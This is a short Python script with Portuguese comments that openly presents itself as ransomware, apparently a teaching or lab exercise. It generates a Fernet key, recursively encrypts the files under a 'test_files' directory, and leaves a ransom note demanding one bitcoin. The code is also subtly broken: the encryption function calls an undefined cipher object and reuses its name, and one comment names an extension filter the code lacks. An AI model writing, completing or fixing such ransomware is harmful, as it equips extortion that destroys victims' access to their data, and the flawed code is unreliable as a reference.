from cryptography.fernet import Fernet # Fernet é uma classe que oferece criptografia simétrica (a mesma chave é usada para criptografar e descriptografar).
import os # os é usado para manipular arquivos e percorrer diretórios.

def gerar_chave():  # Gera uma chave Fernet (usada por cryptography.Fernet) e salva em arquivo.
    chave = Fernet.generate_key()
    with open("chave.key", "wb") as chave_file:
        chave_file.write(chave)

def carregar_chave(): # Abre 'chave.key' em modo binário e retorna seu conteúdo (bytes).
    return open("chave.key", "rb").read()

def criptografar_arquivo(arquivo, chave):  # Inicializa o objeto de cifra com a chave fornecida 
    with open(arquivo, "rb") as file:
        dados = file.read()
    dados_encriptados = f.encrypt(dados)
    with open(arquivo, "wb") as f:
        f.write(dados_encriptados)

def encontrar_arquivos(diretorio): # Percorre recursivamente 'diretorio' usando os.walk e retorna lista de caminhos para arquivos que terminam com EXT_ALVO.
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            if nome != "ransoware.py" and not nome.endswith(".key"):
                lista.append(caminho)
    return lista

def criar_mensagem_resgate(): # Mensagem posteriormente de solicitação do pagamento 
    with open("LEIA.txt", "w") as f:
        f.write("Seus arquivos foram criptografados!\n")
        f.write("Envie 1 bitcoin!\n")
        f.write("Enviaremos a chave!\n")

def main(): # Função principal : execução  
    gerar_chave()
    chave = carregar_chave()
    arquivos = encontrar_arquivos("test_files")
    for arquivo in arquivos:
        criptografar_arquivo(arquivo, chave)
    criar_mensagem_resgate()
    print("Ransomware executado! Arquivos criptografados!")

if __name__ == "__main__":  # Define o ponto de execução do script
    main()
